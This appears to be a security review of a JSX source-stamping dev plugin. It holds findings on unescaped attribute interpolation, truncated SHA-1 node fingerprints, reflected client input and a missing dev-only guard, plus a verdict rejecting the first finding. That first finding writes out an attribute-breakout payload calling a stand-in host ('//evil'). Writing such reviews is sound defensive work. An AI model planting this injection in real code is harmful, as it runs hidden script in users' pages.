samples.summary: `rootName` is interpolated into a generated JSX attribute value with no escaping, allowing attribute break-out (and therefore JSX-expression injection) into the module the dev server compiles and executes
samples.evidence: stamp.mjs:103 builds `id = `${rootName}:${entry.path.join('.')}`` and line 109 splices it into ` data-wb-node="${id}"` with no validation, on the stated assumption that "Values are an identifier, digits/dots, and hex" (comment at stamp.mjs:105-106). `rootName` is not an identifier: it comes from `findJsxRoots` → `d.name.getText()` (jsx-nodes.mjs:471), which returns the RAW SOURCE TEXT of a variable declaration name. A binding pattern is accepted there because the only test is `ts.isArrowFunction(init)`, so a declaration such as `const { "a\" onMouseOver={fetch('//evil')} x=\"": c } = () => <div/>;` (valid TSX, parsed by `parse()` with no typecheck) yields a root name containing double quotes, and a binding pattern containing a comment (`const { a /* " */ } = () => <div/>;`) does too, since `getText()` spans internal trivia. The emitted text then reads `data-wb-node="{ "a\" onMouseOver={fetch('//evil')} x=\"": c }:0"` — JSX attribute strings do not process backslash escapes, so the value terminates early and the remaining source-controlled text is parsed as further attributes, including a `{...}` expression that executes when the frame renders. Note the author already recognised this class of problem for the sibling value: `file` is refused when it matches `/["<>&]/` (stamp.mjs:72), but `id` gets no equivalent guard. Attacker must control (or supply via a staged `layout-insert` `raw` payload, which is patched into the text this function receives — see the `@param {string} text` note "the PATCHED text, not disk") a declaration in the stamped file; impact is arbitrary code in the dev-server frame realm. Fix: reject/encode non-`[A-Za-z0-9_$]` root names before stamping, as is already done for `file`.

samples.summary: Node identity (`fp`/`fpx`) is SHA-1 truncated to 32 bits and is what decides which source node a write lands on
samples.evidence: `fpOf` (jsx-nodes.mjs:587) and `fpxOf` (jsx-nodes.mjs:614-617) both `.slice(0, 8)` the hex digest, i.e. 32 bits. `resolveNode` uses these values to relocate an anchor when the path hint fails (jsx-nodes.mjs ~672-690) and then writes to the matched node. A 32-bit key is trivially brute-forced: content that reaches `fpOf`'s payload (tag, sorted attribute names, identity-attribute VALUES such as `id`/`href`/`data-testid`, and the first 40 chars of text) is partly influenceable through a staged `raw` insert payload, so a crafted node can be made to share a target's `fp`. The unique-match rule turns a collision into a refusal rather than a mis-write in the common case, which caps this at a denial of the edit rather than a redirect — but the identity of a write target resting on 32 bits of a hash is thin, and a collision with a node the anchor's true target no longer matches would resolve to the wrong element silently. Widening to 16 hex chars costs nothing.

samples.summary: Client-supplied `anchor.component` is reflected verbatim, unbounded and unsanitised, into the `reason` string returned to the caller
samples.evidence: jsx-nodes.mjs:658 and :663 build `reason` by interpolating `anchor.component` directly. The doc comment on `resolveNode` and the Object.prototype test in test/server/jsx-nodes.test.mjs both state that `anchor.component` "arrives from the client, so it is not constrained to names present in the file". Nothing length-limits it or strips markup, so the value round-trips to whatever surface renders the failure reason. If that surface uses `innerHTML`/`dangerouslySetInnerHTML` (the consuming client is not in this branch, so I could not complete the chain) this is reflected XSS in the editor UI; at minimum it is an unbounded echo of untrusted input into an error channel. Truncating and allowlisting the echoed name to `[A-Za-z0-9_$]{0,64}` removes the question.

samples.summary: The "dev-only" property of the stamping transform is asserted in a comment but enforced by nothing in this branch — no environment guard in the function and no registering plugin exists yet
samples.evidence: stamp.mjs:51-54 states "It never runs against the frontend's own dev server or production build — it is registered only by the sandbox's Vite config, and only for modules carrying the `?wbFrame=` query." That Vite config is not in the repository: `stampSource` has no callers outside the two test files, and no vite.config.ts registers it. `stampSource` itself contains no `process.env.NODE_ENV`/`command === 'serve'` guard, so a future (or careless) registration in a build pipeline would emit `data-wb-file` source paths, `data-wb-node` root names and fingerprints into shipped HTML — a source-structure disclosure — with nothing failing. A one-line guard, or a documented precondition asserted at the call boundary when the plugin lands, closes it. Reported as absence because the enforcement point, not the transform, is what is missing.
searchedFor: Grep 'stampSource' across the repo — only stamp.mjs, stamp.test.mjs, stamp.types.test.mts
Grep 'wbFrame' — matches only in docs/design/design-editor/*.md, docs/tasks/*, and the stamp.mjs comment; no code registers a plugin
Glob '**/vite.config.*' — board, docs, frontend, notes, sheets, slides; none reference design-editor
Read packages/design-editor/package.json — private, no exports field, no plugin entry point

verdict.reason: The code facts are accurate: stamp.mjs:103/109 interpolate `rootName` into a double-quoted JSX attribute with no escaping while stamp.mjs:72 guards `file` with /["<>&]/, and jsx-nodes.mjs:465-471 takes `d.name.getText()` with no ts.isIdentifier check, so a binding pattern's raw source text (quotes included) can become a root name. But it is not a security defect under this lens. (1) No trust boundary is crossed: the only carrier of a hostile root name is the source text of the .tsx module the dev server is about to compile and execute, so an actor who can plant `const { "a\" onMouseOver={...}": c } = () => <div/>` can equivalently write `<div onMouseOver={...}/>` directly — the claimed impact ("arbitrary code in the dev-server frame realm") is already implied by the precondition, with no escalation. (2) The staged `layout-insert` `raw` vector has the same property by design — the recipe defines `raw` as an exact verbatim source span spliced into the file and compiled (sandbox-recipe.md:813) — and it does not exist in this repo anyway: packages/design-editor/src contains only jsx-nodes.mjs, stamp.mjs and types.ts, and `stampSource` has no non-test caller anywhere (grep for stampSource/wbFrame hits only tests and docs). The tool is a local developer plugin operating on the developer's own checkout (sandbox-recipe.md:1030). What remains is a real code-generation/robustness bug (a component declared via a destructuring pattern emits malformed JSX), which belongs to the correctness lens, not to authorization/secrets/injection-across-a-boundary/crypto.
